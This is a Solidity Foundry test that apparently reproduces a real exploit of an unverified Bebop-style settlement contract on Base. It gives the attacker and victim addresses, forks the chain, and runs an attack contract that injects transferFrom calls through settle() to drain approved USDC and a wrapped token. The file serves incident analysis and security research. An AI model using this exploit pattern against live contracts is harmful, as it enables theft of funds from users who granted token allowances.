// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 3,875.46 USD
// Attacker : 0x473993E254be8D46eD85b149335b2Be02b2891f1
// Attack Contract : 0xbf8e523170875107fD3c36C6Cf3e350DC52a5021
// Vulnerable Contract : 0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6
// Attack Tx : https://basescan.org/tx/0x9099383a0731fcd40550f6443c935f579085251d34b7c7285603f68b7c12f678
//
// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1660
//
// Attack summary: The attacker deployed initcode that created a helper contract and called a Bebop-style settlement
// function. The settlement call carried two explicit transferFrom interactions, moving USDC from one approved account
// and a wrapped asset from the reported victim to the attacker.
// Root cause: the unverified settlement contract accepted caller-controlled interaction calldata and executed token
// transferFrom calls against accounts that had granted it allowance.

address constant ATTACKER = 0x473993E254be8D46eD85b149335b2Be02b2891f1;
address constant ATTACK_CONTRACT = 0xbf8e523170875107fD3c36C6Cf3e350DC52a5021;
address constant VICTIM = 0x9eaC82DF212c6c85a125F6c7db3285f4Db93dD7b;
address constant SETTLEMENT = 0xbeb0b0623f66bE8cE162EbDfA2ec543A522F4ea6;
address constant USDC_HOLDER = 0x78300ee5b60f6Fe87D64c02F393dEe502560EE87;
address constant USDC_TOKEN = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant VICTIM_TOKEN = 0x2615a94df961278DcbC41Fb0a54fEc5f10a693aE;

uint256 constant USDC_AMOUNT = 1_000_000_000;
uint256 constant VICTIM_TOKEN_AMOUNT = 901_467_122_762_682_970_176;

interface IBebopSettlement {
    struct Order {
        address maker;
        address receiver;
        uint256 expiry;
        uint256 nonce;
        uint256 flags;
        address executor;
        uint256 partnerId;
        address[] makerTokens;
        address[] takerTokens;
        uint256[] makerAmounts;
        uint256[] takerAmounts;
        bool usePermit2;
    }

    struct Interaction {
        bool result;
        address target;
        uint256 value;
        bytes data;
    }

    function settle(
        Order calldata order,
        bytes calldata signature,
        Interaction[] calldata interactions,
        bytes calldata data,
        address receiver
    ) external payable;
}

contract ContractTest is BaseTestWithBalanceLog {
    BaseBebopSettlementAttack private exploit;

    function setUp() public {
        uint256 forkBlock = 34_100_255;
        vm.createSelectFork("base", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VICTIM, "Victim");
        vm.label(SETTLEMENT, "Settlement");
        vm.label(USDC_HOLDER, "USDC Holder");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(VICTIM_TOKEN, "Victim Token");

        exploit = new BaseBebopSettlementAttack();
        multiAssetLog = true;
        attacker = address(exploit);
        _addFundingToken(USDC_TOKEN);
        _addFundingToken(VICTIM_TOKEN);
    }

    function testExploit() public balanceLog {
        uint256 usdcHolderBefore = IERC20(USDC_TOKEN).balanceOf(USDC_HOLDER);
        uint256 victimTokenBefore = IERC20(VICTIM_TOKEN).balanceOf(VICTIM);

        exploit.run();

        assertEq(IERC20(USDC_TOKEN).balanceOf(address(exploit)), USDC_AMOUNT, "USDC profit");
        assertEq(IERC20(VICTIM_TOKEN).balanceOf(address(exploit)), VICTIM_TOKEN_AMOUNT, "victim-token profit");
        assertEq(usdcHolderBefore - IERC20(USDC_TOKEN).balanceOf(USDC_HOLDER), USDC_AMOUNT, "USDC holder loss");
        assertEq(victimTokenBefore - IERC20(VICTIM_TOKEN).balanceOf(VICTIM), VICTIM_TOKEN_AMOUNT, "victim token loss");
    }
}

contract BaseBebopSettlementAttack {
    function run() external {
        IBebopSettlement.Order memory order;
        order.maker = address(this);
        order.receiver = address(this);
        order.expiry = block.timestamp + 60;
        order.flags = 1;
        order.executor = address(this);

        IBebopSettlement.Interaction[] memory interactions = new IBebopSettlement.Interaction[](2);
        interactions[0] = IBebopSettlement.Interaction({
            result: false,
            target: USDC_TOKEN,
            value: 0,
            data: abi.encodeWithSelector(IERC20.transferFrom.selector, USDC_HOLDER, address(this), USDC_AMOUNT)
        });
        interactions[1] = IBebopSettlement.Interaction({
            result: false,
            target: VICTIM_TOKEN,
            value: 0,
            data: abi.encodeWithSelector(IERC20.transferFrom.selector, VICTIM, address(this), VICTIM_TOKEN_AMOUNT)
        });

        IBebopSettlement(SETTLEMENT).settle(order, "", interactions, "", address(this));
    }
}
